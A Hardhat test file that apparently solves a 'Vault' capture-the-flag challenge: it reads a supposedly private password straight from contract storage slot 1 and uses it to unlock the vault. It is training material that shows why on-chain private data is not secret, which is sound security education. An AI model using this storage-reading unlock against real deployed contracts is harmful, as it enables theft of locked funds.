const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const CONTRACT_NAME = "Vault";
const PASSWORD = ethers.utils.formatBytes32String("Top secret password")
describe(CONTRACT_NAME, function () {
  async function deployLoadFixture() {
    const [owner, attacker] = await ethers.getSigners();

    const Volt = await ethers.getContractFactory(CONTRACT_NAME);
    const volt = await Volt.deploy(PASSWORD);


    return { volt, attacker };
  }

  it("Challenge Solved", async function () {
    const { volt } = await loadFixture(deployLoadFixture);

    // get the password from the storage
    const storageValue = await ethers.provider.getStorageAt(volt.address, 1)

    // unlock the vault
    const tx = await volt.unlock(storageValue)
    await tx.wait()

    //test
    const lockStatus = await volt.locked()
    expect(lockStatus).to.equal(false)
  });
});
